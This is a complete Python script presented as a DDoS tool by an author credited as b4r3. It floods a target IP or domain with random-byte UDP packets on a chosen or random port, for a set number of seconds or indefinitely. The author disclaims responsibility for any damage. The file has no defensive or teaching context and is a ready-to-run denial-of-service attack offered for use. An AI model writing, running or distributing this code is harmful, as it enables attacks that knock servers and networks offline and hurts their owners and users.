from time import time as tt
import argparse, socket, random, os

## SCRIPT DEVELOPED BY @b4r3 ##
## USE WISELY, I AM NOT RESPONSIBLE FOR ANY DAMAGE THATS BEEN DONE WITH THIS SCRIPT ##

print("|-------------------------------|")
print("|----- DDoS SCRIPT by b4r3 -----|")
print("|-------------------------------|")

def attack(ip, port, time, size):
    if port is not None:
        port = max(1, min(65535, port))

    if time is None:
        time = float("inf")

    msg = "\nATTACKING IP: {ip}\nPORT: {port}\nTIME: {time}\nSIZE: {size} bytes".format(
        ip=ip,
        port="{port}".format(port=port) if port else "random",
        time="{time} seconds".format(time=time) if str(time).isdigit() else "infinite",
        size=size
    )
    print(msg)

    start = tt()
    size = os.urandom(min(65500, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        port = port or random.randint(1, 65535)

        end = tt()
        if (start + time) < end:
            break

        sock.sendto(size, (ip, port))

    print("|----------------------------------|")
    print('|---- Attack has been finished ----|')
    print("|----------------------------------|")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="")

    parser.add_argument("ip", type=str, help="IP or Domain to attack")
    parser.add_argument("-p", "--port", type=int, default=None, help="Port")
    parser.add_argument("-t", "--time", type=int, default=None, help="Time (seconds)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Size (bytes)")

    args = parser.parse_args()

    try:
        attack(args.ip, args.port, args.time, args.size)
    except KeyboardInterrupt:
        print("|---------------------------------|")
        print('|---- Attack has been stopped ----|')
        print("|---------------------------------|")
